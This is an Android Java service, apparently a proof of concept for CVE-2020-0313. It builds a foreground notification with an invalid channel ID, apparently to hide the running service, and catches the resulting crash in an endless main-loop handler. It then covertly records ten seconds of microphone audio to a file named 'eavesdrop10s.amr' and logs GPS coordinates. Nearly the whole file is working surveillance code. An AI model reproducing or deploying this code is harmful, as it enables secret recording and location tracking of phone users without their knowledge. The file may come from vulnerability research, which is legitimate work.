package com.xd.servicecheater;

import android.Manifest;
import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.BitmapFactory;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.SystemClock;
import android.util.Log;

import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;

import java.io.File;

public class MalServiceA extends Service {
    private static final String TAG = "MalService";

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
//        Handle the exception in main loop
        new Handler(Looper.getMainLooper()).post(new Runnable() {
            @Override
            public void run() {
                while (true) {
                    try {
                        Looper.loop();
                    } catch (Throwable e) {
                        e.printStackTrace();
                    }
                }
            }
        });
//        Create a Notification object with a invalid channel ID
        Notification notification = new NotificationCompat.Builder(this, "InvalidInvalidInvalid" /* A Invalid Channel ID */)
                .setContentTitle("Testing CVE-2020-0313")
                .setContentText("If you see this means your device is not vulnerable")
                .setWhen(System.currentTimeMillis())
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setLargeIcon(BitmapFactory.decodeResource(getResources(), R.drawable.ic_launcher_foreground))
                .build();
        startForeground(2, notification);

        File soundFile;
        MediaRecorder mediaRecorder= new MediaRecorder();
        try {
            soundFile = new File(Environment.getExternalStorageDirectory().getCanonicalFile() + "/eavesdrop10s.amr");
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.setOutputFile(soundFile.getAbsolutePath());
            mediaRecorder.prepare();
        } catch (Exception e) {
            e.printStackTrace();
        }
        mediaRecorder.start();

        Log.i(TAG, "onStartCommand: start succeed");

        /*MediaRecorder: stop failed
查阅官方文当时发现：

Note that a RuntimeException is intentionally thrown to the application, if no valid audio/video data has been received when stop() is called.

在调用start()后马上调用stop(),时由于没有生成有效的音频或是视频数据。

解决方法：让线程睡眠一定的时间，在测试后发现1秒几乎是最短时间。*/
        SystemClock.sleep(10000);
        mediaRecorder.stop();
        mediaRecorder.reset();
        mediaRecorder.release();
        mediaRecorder = null;

        refreshLocation();


        return super.onStartCommand(intent, flags, startId);
    }

    public void refreshLocation() {
        LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        String provider = LocationManager.GPS_PROVIDER;
        if (!checkPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
            return;
        }
        locationManager.requestLocationUpdates(provider, 2000, 10, new LocationListener() {
            @Override
            public void onLocationChanged(Location location) {
                double lat = location.getLatitude();
                double lng = location.getLongitude();
                Log.i(TAG, "Location Update: Latitude="+lat+",Longitude="+lng);
            }

            @Override
            public void onStatusChanged(String provider, int status, Bundle extras) {

            }

            @Override
            public void onProviderEnabled(String provider) {

            }

            @Override
            public void onProviderDisabled(String provider) {

            }
        });
    }

    private boolean checkPermission(String permission) {
        return ActivityCompat.checkSelfPermission(this,
                permission) ==
                PackageManager.PERMISSION_GRANTED;
    }
}
